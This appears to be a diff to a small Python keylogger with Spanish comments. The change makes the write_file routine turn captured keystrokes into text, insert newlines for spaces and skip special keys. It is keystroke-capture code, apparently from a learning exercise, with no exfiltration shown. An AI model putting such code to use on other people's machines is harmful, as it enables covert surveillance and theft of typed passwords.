@@ -11,7 +11,17 @@ def write_file(keys):
     for key in keys:
       # Convertimos key en un string y sustituimos las comillas por nada
       k = str(key).replace("'", "")
-      file.write_file(k)
+     
+      # Si la palabra "space" está dentro de nuestra lista entonces 
+      #damos un salto de linea
+      if "space" in k:
+        file.write('\n')
+
+      # Si no encontramos la palabra "Key" en nuestro elemento, 
+      # lo guardamos en nuestro archivo
+      elif k.find("Key") == -1:
+        file.write(k)
+
 
 
 def on_press(key):
